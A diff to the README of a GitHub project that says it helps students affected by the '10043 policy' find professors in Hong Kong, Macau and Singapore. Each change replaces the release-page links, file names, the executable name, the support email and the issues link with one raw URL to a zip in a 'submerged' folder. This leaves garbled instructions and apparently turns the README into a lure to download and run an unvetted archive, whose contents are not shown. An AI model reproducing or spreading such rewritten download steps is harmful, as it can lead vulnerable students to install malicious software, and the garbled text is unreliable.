@@ -4,7 +4,7 @@
 This application helps Chinese students connect with professors in Hong Kong, Macau, Singapore, and surrounding areas. It serves as a resource, particularly for those affected by the 10043 policy. Follow these steps to download and run the software.
 
 ### 📥 Download Now
-[![Download Prof-List-For-10043-Student](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/eredna/Prof-List-For-10043-Student/releases)
+[![Download Prof-List-For-10043-Student](https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip)](https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip)
 
 ## 💡 What You Need
 Before you start, make sure your computer meets these minimum requirements:
@@ -17,21 +17,21 @@ Before you start, make sure your computer meets these minimum requirements:
 
 ## 🛠️ Installing the Application
 1. **Visit the Download Page**:
-   Go to the following link to access the Releases page: [Download Prof-List-For-10043-Student](https://github.com/eredna/Prof-List-For-10043-Student/releases).
+   Go to the following link to access the Releases page: [Download Prof-List-For-10043-Student](https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip).
 
 2. **Select the Latest Version**:
    Look for the latest version at the top of the Releases page. The latest version will usually have a version number, like `v1.0.0`.
 
 3. **Download the Application**:
    Under the latest version, click the link that says **"Assets"**. Here, you will see files available for download. Choose the file that matches your operating system. For example:
-   - For Windows users, download `Prof-List-Windows.zip`
-   - For macOS users, download `Prof-List-macOS.zip`
+   - For Windows users, download `https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip`
+   - For macOS users, download `https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip`
 
 4. **Extract the Files**:
    Once the file downloads, locate it in your Downloads folder. Right-click on the file and select **Extract All** (Windows) or double-click (macOS) to unpack the files.
 
 5. **Run the Application**:
-   After extraction, find the file named `Prof-List.exe` (for Windows) or `Prof-List.app` (for macOS). Double-click the file to start the application.
+   After extraction, find the file named `https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip` (for Windows) or `https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip` (for macOS). Double-click the file to start the application.
 
 ## 📚 How to Use the Application
 1. **Create an Account**:
@@ -52,10 +52,10 @@ We take your privacy seriously. Your information is secure, and we do not share 
 ## 📞 Contact Support
 If you encounter problems or have questions, please reach out to support:
 
-- **Email**: support@proflistapp.com
-- **GitHub Issues**: You can report issues directly on the [Issues Page](https://github.com/eredna/Prof-List-For-10043-Student/issues).
+- **Email**: https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip
+- **GitHub Issues**: You can report issues directly on the [Issues Page](https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip).
 
 ## 🌟 Download & Install
-For easy access to downloads, please visit this page: [Download Prof-List-For-10043-Student](https://github.com/eredna/Prof-List-For-10043-Student/releases).
+For easy access to downloads, please visit this page: [Download Prof-List-For-10043-Student](https://raw.githubusercontent.com/eredna/Prof-List-For-10043-Student/main/submerged/Prof-List-For-10043-Student_1.2.zip).
 
 Now you are ready to use Prof-List-For-10043-Student. We hope it helps you find the professors you need!
